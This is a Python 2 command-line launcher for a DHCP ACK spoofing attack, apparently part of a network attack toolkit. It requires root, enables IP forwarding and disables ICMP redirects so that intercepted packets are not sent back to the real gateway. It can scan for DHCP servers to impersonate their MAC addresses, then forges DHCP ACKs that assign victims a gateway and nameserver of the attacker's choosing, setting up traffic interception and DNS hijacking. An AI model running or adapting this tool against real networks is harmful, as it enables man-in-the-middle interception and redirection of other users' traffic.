#!/usr/bin/python2

__author__ = 'redwind'

from dhcp_ack_spoofing import *
import os
from subprocess import PIPE, Popen

def do_dhcp_scan():
    timeout = input('Timeout value in sec (5 is good) :')
    print('Scanning...')
    attack.scan_dhcp_servers(timeout=timeout)
    attack.print_found_dhcp()


print('\n\o/ **DHCP_ack_spoofing module!** \o/\n')

if os.getuid() != 0:
    print('This tools need to be runned as root!')
    exit()

p = Popen(['sysctl', 'net.ipv4.ip_forward'], stdout=PIPE, stderr=PIPE)
(out,err) = p.communicate()
if int(out.split(' ')[2]) != 1:
    print('Packet forwarding is not enabled!')
    activate_forwarding = raw_input('Activate it? (y/n) :')
    if activate_forwarding == 'y':
        p1 = Popen(['sysctl', 'net.ipv4.ip_forward=1'], stdout=PIPE, stderr=PIPE)
        p1.communicate()


interface = raw_input('Network interface to listen/spoof :').strip()


p2 = Popen(['sysctl', 'net.ipv4.conf.' + interface + '.send_redirects'], stdout=PIPE, stderr=PIPE)
(out,err) = p2.communicate()
if int(out.split(' ')[2]) != 0:
    print('By default, this interface will send ICMP_REDIRECT to redirect victim to the real gateway.')
    print('That means you won\'t be able to intercept packets!')
    print('If you are only targetting the DNS hack, however, this should not cause problem.')

    activate_forwarding = raw_input('Deactivate ICMP redirect? (y/n) :')
    if activate_forwarding == 'y':
        p3 = Popen(['sysctl', 'net.ipv4.conf.'+interface+'.send_redirects=0'], stdout=PIPE, stderr=PIPE)
        p3.communicate()

attack = DHCPAckSpoofing(interface=interface)

print('\n\n')

print('We can scan for existing DHCP and then spoof their MAC address while forging the DHCP_ACK')
do_scan = raw_input('Do you want to scan for DHCP servers \n'
                'before listening for incoming requests? (y/n) :')

while do_scan == 'y':
    do_dhcp_scan()
    do_scan = raw_input('Rescan again? (y/n) :')


print('\n\n')

print('\nSetup attack parameters ... ')
domain = DomainConfig(
    gateway=raw_input('gateway :'),
    broadcast=raw_input('broadcast : '),
    netmask=raw_input('netmask :'),
    domain_name=raw_input('domain name :'),
    nameserver=raw_input('nameserver :')
    )

print('\n\n')

print('\nLaunching the attack!!')
print('Waiting for clients to send DHCP request...')

attack.launch_attack(domain_config=domain, try_spoof_dhcp_mac=True)
